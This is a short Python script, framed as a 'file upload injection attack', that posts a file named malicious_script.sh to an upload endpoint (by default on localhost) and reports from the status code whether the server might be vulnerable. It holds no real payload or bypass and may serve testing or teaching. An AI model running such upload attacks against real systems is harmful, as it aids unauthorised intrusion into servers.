import requests

def file_upload_injection_attack(target_url, file_path):

    with open(file_path, 'rb') as malicious_file:
        
        files = {
            'file': malicious_file
        }

        # Send the malicious file to the target URL
        response = requests.post(target_url, files=files)

        if response.status_code == 200:
            print("File uploaded successfully. The server might be vulnerable!")
        else:
            print(f"File upload failed. Status code: {response.status_code}")

if __name__ == "__main__":
    # Target vulnerable file upload API (replace with actual target)
    target_url = "http://localhost:5000/upload"
    
    
    file_path = "malicious_script.sh"  

    
    file_upload_injection_attack(target_url, file_path)